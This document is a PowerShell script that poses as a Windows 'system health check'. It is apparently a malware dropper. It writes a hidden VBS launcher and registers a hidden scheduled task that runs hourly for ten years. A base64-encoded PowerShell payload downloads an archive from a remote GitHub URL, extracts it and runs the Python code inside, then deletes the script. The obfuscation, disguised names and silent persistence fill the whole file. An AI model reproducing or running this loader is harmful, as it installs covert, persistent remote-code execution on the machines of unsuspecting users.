Unregister-ScheduledTask -TaskName "WindowsSystemHealthCheck" -Confirm:$false -ErrorAction SilentlyContinue

$TaskName = "WindowsSystemHealthCheck"
$AppDir = Join-Path $env:LOCALAPPDATA "WindowsSystemHealth"

if (!(Test-Path $AppDir)) {
    New-Item -Path $AppDir -ItemType Directory -Force | Out-Null
}

$VbsLauncherPath = Join-Path $AppDir "LaunchSystemCheck.vbs"

$Encoded = "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAAoAJABXAG8AcgBrAEQAaQByACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACAAIgBXAGkAbgBkAG8AdwBzAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoACIACgAkAFUAcABkAGEAdABlAEQAaQByACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABXAG8AcgBrAEQAaQByACAAIgBVAHAAZABhAHQAZQBUAGUAbQBwACIACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAVQBwAGQAYQB0AGUARABpAHIAKQApACAAewAgAE4AZQB3AC0ASQB0AGUAbQAgACQAVQBwAGQAYQB0AGUARABpAHIAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsACAAfQAKAAoAJABHAGkAdABIAHUAYgBVAFIATAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYwBoAGUAaQBrAGgAbwB1AGQAaQBlAG4AZwAvAHMAZQBjAHUAcgBpAHQAeQAtAGMAZQByAHQAcwAtAHUAcABkAGEAdABlAHMALwByAGEAdwAvAG0AYQBpAG4ALwBzAGUAYwB1AHIAaQB0AHkALQBjAGUAcgB0AHMALQB1AHAAZABhAHQAZQBzAC4AZABhAHQAIgAKACQARgBpAG4AYQBsAEYAbwBsAGQAZQByAFAAYQB0AGgAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFcAbwByAGsARABpAHIAIAAiAEwAYQB0AGUAcwB0AF8AQwBlAHIAdABzAF8ARABhAHQAYQAiAAoAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFcAbwByAGsARABpAHIAIAAiAHMAeQBzAF8AdQBwAGQAYQB0AGUALgB6AGkAcAAiAAoACgB0AHIAeQAgAHsACgAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIACgAgACAAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJABHAGkAdABIAHUAYgBVAFIATAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAtAFAAcgBpAG8AcgBpAHQAeQAgAEYAbwByAGUAZwByAG8AdQBuAGQAIAAtAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgACIAUwB5AHMAdABlAG0AVQBwAGQAYQB0AGUAIgAKACAAIAAgACAAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQARwBpAHQASAB1AGIAVQBSAEwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAFoAaQBwAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgAgACAAIAAgAH0ACgAKACAAIAAgACAAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAWgBpAHAARABlAHMAdABpAG4AYQB0AGkAbwBuACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAEYAaQBuAGEAbABGAG8AbABkAGUAcgBQAGEAdABoACkAIAB7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlACAAfQAKACAAIAAgACAAIAAgACAAIABFAHgAcABhAG4AZAAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIAAkAFoAaQBwAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAkAEYAaQBuAGEAbABGAG8AbABkAGUAcgBQAGEAdABoACAALQBGAG8AcgBjAGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABaAGkAcABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAFAAeQB0AGgAbwBuAEUAeABlACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAAgACIAaABlAGEAbAB0AGgAXwBtAG8AbgBpAHQAbwByAC4AZQB4AGUAIgAKACAAIAAgACAAJABJAG4AcwB0AGEAbABsAFMAYwByAGkAcAB0ACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABGAGkAbgBhAGwARgBvAGwAZABlAHIAUABhAHQAaAAgACIAcwBlAHQAdQBwAC4AcAB5ACIACgAKACAAIAAgACAAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAUAB5AHQAaABvAG4ARQB4AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAkAEYAaQBuAGEAbABGAG8AbABkAGUAcgBQAGEAdABoAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAEkAbgBzAHQAYQBsAGwAUwBjAHIAaQBwAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAUAB5AHQAaABvAG4AQwBvAGQAZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAEkAbgBzAHQAYQBsAGwAUwBjAHIAaQBwAHQAIAAtAFIAYQB3AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAEkAbgBzAHQAYQBsAGwAUwBjAHIAaQBwAHQAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFQAYQBzAGsAIAA9ACAARwBlAHQALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAUwB5AHMAdABlAG0ASABlAGEAbAB0AGgAQwBoAGUAYwBrACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQARgB1AGwAbABBAHIAZwBzACAAPQAgACQAVABhAHMAawAuAEEAYwB0AGkAbwBuAHMAWwAwAF0ALgBBAHIAZwB1AG0AZQBuAHQAcwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABDAHUAcgByAGUAbgB0AEUAbgBjAG8AZABlAGQAIAA9ACAAJABGAHUAbABsAEEAcgBnAHMALgBTAHAAbABpAHQAKAAnACAAJwApAFsALQAxAF0ALgBSAGUAcABsAGEAYwBlACgAJwAiACcALAAnACcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7ACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQwB1AHIAcgBlAG4AdABFAG4AYwBvAGQAZQBkACAAPQAgACIATgBvAG4AZQAiACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFAAeQB0AGgAbwBuAEMAbwBkAGUAIAB8ACAAJgAgACQAUAB5AHQAaABvAG4ARQB4AGUAIAAtACAAJABDAHUAcgByAGUAbgB0AEUAbgBjAG8AZABlAGQACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAfQA="

$VbsCode = "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $Encoded"", 0, False"
Set-Content -Path $VbsLauncherPath -Value $VbsCode -Encoding Ascii -Force

$Action   = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsLauncherPath`""
$Trigger  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 3650)
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings
Start-ScheduledTask -TaskName $TaskName